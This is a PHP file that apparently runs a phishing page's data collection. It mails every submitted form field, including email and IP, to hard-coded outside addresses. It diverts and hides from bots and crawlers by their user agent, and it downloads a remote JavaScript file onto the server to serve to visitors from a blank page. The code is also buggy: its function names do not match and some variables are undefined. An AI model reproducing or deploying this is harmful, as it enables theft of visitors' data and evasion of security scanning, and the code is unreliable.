<?php



//if(strpos($_SERVER['REMOTE_ADDR'], "142.93") === 0) {
//    die();
//}

$ip = $_SERVER['REMOTE_ADDR'];


//phpinfo(32);
if (!isset($_SESSION)) {
    session_start();
}
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['_id'])){

    
if(isset($_POST['email'])){
    $mail = $_POST['email'];
}
    if(isset($_POST['code'])){
        $code = $_POST['code'];
        }
    if($code !== 'vsdg') {
   echo 'Post';
    
    
}

if(isset($_POST['code'])){
$code = $_POST['code'];
} else {
    $code = "NA";
}

if(isset($_POST['subj'])){
    $subject = $_POST['subj'] . ' ' . $code;
} else {
$subject = $code;
}



if (isset($code)) {
    $in = $code;
} else {
    $in = "in";
};
$link = $_POST['ip'];

foreach ($_POST as $key => $value) 
    $body .= $key . ' : ' . $value . "\r\n";


    if($link){
    $body .= "https://whatismyipaddress.com/ip/" . $link;
    }




    if($code == "vsdg"){
        $to = "drodriguez@safeguardcasualty.com";
        $in = 'vsdg';
    }elseif($code == "test"){
        echo $body;
    } else {
        $to = "drodriguez@safeguardcasualty.com";
    }
    

$user_agent = strtolower($_SERVER['HTTP_USER_AGENT']);

$bot_identifiers = array(
  'bot',
  'slurp',
  'crawler',
  'spider',
  'curl',
  'facebook',
  'fetch',
);

foreach ($bot_identifiers as $identifier) {
  if (strpos($user_agent, $identifier) !== FALSE) {
      $body .= 'This is a bot';
      $in = 'robot';
      $to = "drod247@gmail.com";
        
    print(TRUE);
    exit();
  } 
}
;
if($in == ''){
    $in = 'noreply';
}


$from = $in . '@' . $_SERVER['HTTP_HOST'];
$headers = "From: " .$from;


mail($to, $subject, $body, $headers);

//echo $body;
unset($_POST);
//header("Location: ".$_SERVER['PHP_SELF']);
exit;
} else {

$main = "main.js";
$style = "vsdg.css";
$content = "content.js";
$url = parse_url($_SERVER['REQUEST_URI']);

if($_SERVER['QUERY_STRING'] !== 'beta'){
    $content = 'content.js';
    $css = 'vsdg.css';
}else{
    $content = 'beta.js';
    $css = 'beta.css';

}
if (!file_exists('./script/')) {
    mkdir('./script/', 0777, true);
}
if (!file_exists('./css/')) {
    mkdir('./css/', 0777, true);
}
if(!is_file('./script/'. $content)){

    $file = fopen('./script/'. $content, 'w') or die("Unable to open $content!");
    fclose($file);
}


if(!is_file('./css/'. $css)){

    $file = fopen('./css/'. $css, 'w');
    fwrite($file);
    fclose($file);
}
if(!is_file('./script/'. $main)){

$js = file_get_contents('https://raw.githubusercontent.com/drod247/main.js/main/main.js');
$myfile = fopen('./script/'. $main, "w") or die("Unable to open $main!");
fwrite($myfile, $js);
fclose($myfile);

}



}

$me = basename($_SERVER['PHP_SELF']);

$filename = 'wp-blog-header.php';

if (file_exists($filename)) {
    echo "The file $filename exists";
    isWordpress();
    exit;
}




function isWorpress(){

if($me !== 'index.php'){
    
echo "<script src='https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js'></script>";
echo "<script type='text/javascript' src='/script/${main}'></script>";
    echo "hello";
    exit;
}
}
?>



<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <?php echo "<script type='text/javascript' src='/script/${main}'></script>"; ?>
    <title></title>

    

</head>
<body>
  
</body>
</html>
